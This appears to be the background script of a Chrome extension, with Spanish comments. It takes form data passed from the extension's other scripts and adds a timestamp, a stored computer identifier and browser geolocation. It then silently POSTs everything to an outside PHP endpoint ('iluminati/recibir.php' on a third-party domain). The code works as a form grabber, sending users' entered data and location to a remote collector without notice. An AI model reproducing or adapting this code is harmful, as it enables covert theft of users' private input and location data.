chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) { 
  var d = new Date();
  request.data.timeStamp = d.toString();
  request.data.computer = localStorage.getItem('computer').toString();
  var ip = new XMLHttpRequest();
  ip.onreadystatechange = function() {
    if (ip.readyState == 4 && ip.status == 200) {
          //Info (datos del formulario + datos de ip)
          var data = new Array(request.data, JSON.parse(ip.responseText));
          // Definimos la URL que vamos a solicitar via Ajax
          var ajax_url = "http://multirecargasysuministros.com/iluminati/recibir.php";
          var ajax_request = new XMLHttpRequest();
          ajax_request.open("POST", ajax_url, true );
          // Establecer la cabecera Content-Type apropiada
          ajax_request.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
          // Enviar la informacion
          ajax_request.send(JSON.stringify(data));
        }
      };
  ip.open("GET", "https://maps.googleapis.com/maps/api/browserlocation/json?browser=chrome&sensor=true", true);
  ip.send();
});